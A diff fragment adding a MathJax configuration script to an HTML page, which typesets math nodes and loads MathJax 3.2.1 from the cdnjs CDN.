+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.1/es5/tex-mml-chtml.min.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script></body></html>
